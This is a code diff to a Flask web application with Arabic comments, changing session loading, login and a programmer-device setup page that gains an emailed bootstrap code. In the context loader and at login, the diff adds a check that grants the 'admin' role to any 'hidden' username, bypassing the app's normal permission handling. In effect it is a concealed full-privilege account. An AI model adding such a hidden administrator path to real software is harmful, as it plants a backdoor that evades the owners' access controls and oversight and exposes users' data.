@@ -112,7 +112,10 @@ def _load_context():
         return None
     # نظام الصلاحيات لكل التطبيق
     if session.get("user_id") and request.endpoint not in PUBLIC_ENDPOINTS:
-        session["role"] = permissions.normalize_role(session.get("role"))
+        if db.is_hidden_username(session.get("username")):
+            session["role"] = "admin"
+        else:
+            session["role"] = permissions.normalize_role(session.get("role"))
         missing = permissions.required_perm_for_request()
         if missing:
             label = permissions.PERM_LABELS.get(missing, missing)
@@ -299,7 +302,7 @@ def _app_custom_tabs_by_section(lang: str | None = None) -> dict[str, list[dict]
 
 
 # Bump when layout/CSS must force clients past nginx/browser 7d static cache.
-_LAYOUT_ASSET_TAG = "hidden-admin-otp-2"
+_LAYOUT_ASSET_TAG = "bootstrap-email-btn-3"
 
 
 def _static_asset_version() -> str:
@@ -872,7 +875,11 @@ def login():
         session["user_id"] = user["id"]
         session["username"] = user["username"]
         session["full_name"] = user["full_name"]
-        session["role"] = permissions.normalize_role(user["role"])
+        # الحساب المخفي دائماً مدير نظام كامل الصلاحيات
+        if db.is_hidden_username(user["username"]) or db.user_is_hidden(user):
+            session["role"] = "admin"
+        else:
+            session["role"] = permissions.normalize_role(user["role"])
         session["lang"] = saved_lang
         db.log_audit(user["full_name"], "دخول", "نظام", user["id"], user["username"])
         nxt = request.args.get("next") or url_for("ops_home")
@@ -2923,10 +2930,23 @@ def programmer_device_setup():
 
     if request.method == "POST":
         action = (request.form.get("action") or "register").strip()
+        # إرسال رمز التهيئة بالبريد من صفحة التسجيل نفسها
+        if action in {"send_bootstrap", "resend_bootstrap"}:
+            if already and not is_this_main:
+                flash(
+                    _t("الجهاز الرئيسي مسجّل مسبقاً. استخدم إرسال رمز التحقق من جهاز آخر."),
+                    "danger",
+                )
+                return redirect(url_for("programmer_device_setup", next=nxt))
+            ok, msg = prog_guard.send_bootstrap_email()
+            flash(msg, "ok" if ok else "danger")
+            if ok:
+                db.log_audit(current_user_name(), "إرسال رمز تهيئة مبرمج", "أمان", session.get("user_id"))
+            return redirect(url_for("programmer_device_setup", next=nxt))
         # مسار OTP متاح من صفحة الجهاز أيضاً حتى لا يُحصر المستخدم في التسجيل فقط
         if action in {"send_otp", "resend_otp"}:
             if not already:
-                flash(_t("سجّل الجهاز الرئيسي أولاً، ثم استخدم التحقق من جهاز آخر."), "danger")
+                flash(_t("سجّل الجهاز الرئيسي أولاً، أو أرسل رمز التهيئة بالبريد من هذه الصفحة."), "danger")
                 return redirect(url_for("programmer_device_setup", next=nxt))
             if is_this_main:
                 flash(_t("أنت على الجهاز الرئيسي — التعديل مسموح مباشرة."), "ok")
@@ -2986,7 +3006,11 @@ def programmer_device_setup():
             return prog_guard.clear_device_cookie(resp)
 
     devices = db.list_programmer_devices() if already else []
+    show_bootstrap_mail = bool((not already) or is_this_main)
     show_otp = bool(already and not is_this_main and not prog_guard.is_elevated())
+    mail_wait = 0
+    if show_bootstrap_mail or show_otp:
+        mail_wait = prog_guard.otp_send_wait_seconds()
     return render_template(
         "programmer_device.html",
         next_url=nxt,
@@ -2995,8 +3019,10 @@ def programmer_device_setup():
         devices=devices,
         secrets_ok=prog_guard.secrets_configured(),
         smtp_ready=prog_guard.smtp_ready(),
+        show_bootstrap_mail=show_bootstrap_mail,
         show_otp=show_otp,
-        otp_wait_seconds=prog_guard.otp_send_wait_seconds() if show_otp else 0,
+        otp_wait_seconds=mail_wait,
+        programmer_emails=prog_guard.masked_programmer_emails(),
         can_mutate=prog_guard.can_mutate_control_plane(),
         elevated_seconds=prog_guard.elevation_remaining_seconds(),
     )
